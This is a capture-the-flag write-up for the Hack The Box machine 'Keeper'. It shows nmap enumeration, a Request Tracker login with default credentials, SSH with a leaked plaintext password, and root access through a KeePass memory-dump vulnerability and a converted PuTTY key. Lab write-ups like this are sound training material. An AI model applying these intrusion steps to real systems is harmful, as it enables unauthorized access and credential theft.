## Summary
Use default credentials to access ticketing system <br/>
Find cleartext password for initial SSH access <br/>
Leverage KeePass vulnerability to retrieve SSH key for root
## Enumeration
#### Port Scanning
We'll start off by running nmap and exporting the results in all formats. 
```
$ nmap -sV -sC -T4 10.10.11.227 -oA nmap       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 13:55 EDT

```
It appears there's only two TCP ports open, 22 (ssh) and 80 (http). Nmap reveals the domain keeper.htb so we'll add that to our hosts file. 

#### Port 80
Upon visiting http://keeper.htb we are met with a link to raise an IT support ticket.

After following the link, we're met with a login page with some interesting details about the tech stack. My first instinct is to find documentation on the application and look for default credentials, followed by searching the web for any CVEs that may apply to version 4.4.4.
![Pasted image 20240709140755.png](https://raw.githubusercontent.com/sullydan/sullydan.github.io/main/assets/images/Pasted%20image%2020240709140755.png)

As luck would have it, the default credentials for Request Tracker authenticate us as the root user. After some poking around, we find a listing of other users among which we find lnorgaard (Lise NÃ¸rgaard.) Lise is a new user with their initial password stored in plaintext.

#### SSH
Let's take those credentials and attempt an SSH connection. 
```
$ ssh lnorgaard@10.10.11.227            
lnorgaard@10.10.11.227's password:

lnorgaard@keeper:~$ whoami
lnorgaard
```
Perfect! We got user access!
## Privilege Escalation
In Lise's home folder, we find the user flag and a zip archive.
```
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
```
Let's download the archive and extract it on our host.
```
$ unzip RT30000.zip
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx 
```
So we have a dump file and running the file command on passcodes.kdbx reveals a KeePass database version 2.x. We can use 'kpcli' to interact with the database but it is password protected. Fortunately for us, this version happens to have a vulnerability that allows us to reveal the master password. Running the tool https://github.com/vdohney/keepass-password-dumper we get the following:
![Pasted image 20240709151105.png](https://raw.githubusercontent.com/sullydan/sullydan.github.io/main/assets/images/Pasted%20image%2020240709151105.png)
Googling the last two words we can reveal the first two characters as part of a popular Danish dessert. Now we can open the database and look for credentials that may help us pivot or escalate our credentials.
```
$ kpcli

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> open passcodes.kdbx 
Provide the master password: 
```
We can then use the built-in find command to look for results related to our domain.
```
kpcli:/> find keeper

```
Since I'm on a Kali host, we can convert this putty key to one we can use with openSSH. We'll save the original as ssh-rsa and using the following command, output our private key as keeper_id_rsa.
```
$ puttygen ssh-rsa -o keeper_id_rsa -O private-openssh
```
Now to use our newfound key to SSH into the server. Note: the root username was specified in the database entry we found.
```
$ ssh -i keeper_id_rsa root@10.10.11.227

That's it, we officially have root!
